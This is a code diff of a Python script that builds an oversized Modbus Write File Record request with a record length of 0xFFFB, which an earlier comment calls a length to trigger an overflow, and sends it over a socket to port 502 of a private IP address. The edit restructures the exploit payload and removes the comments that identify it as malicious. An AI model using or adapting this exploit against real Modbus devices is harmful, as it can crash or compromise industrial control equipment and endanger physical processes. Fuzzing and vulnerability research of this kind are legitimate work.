@@ -7,17 +7,18 @@ logging.basicConfig(level=logging.DEBUG)
 
 def send_malicious_modbus_request():
     try:
-        # Crafting a malicious Modbus request to exploit the vulnerability
-        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + 2 + 1 + 1 + 2 + 0xFFFB, unitId=1) / ModbusPDU15WriteFileRecordRequest(
+        record = ModbusFileRecord(
             referenceType=6,
             fileNumber=0,
             recordNumber=0,
-            recordLength=0xFFFB,  # Malicious length to trigger overflow
+            recordLength=0xFFFB,
             recordData=b'\x00' * 0xFFFB
         )
+        
+        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + len(record), unitId=1) / ModbusPDU15WriteFileRecordRequest(records=[record])
         request_data = bytes(modbus_request)
         
-        # Using socket to send the request
+        # 使用socket發送請求
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect(('10.103.152.8', 502))
             logging.info("Connected to server.")
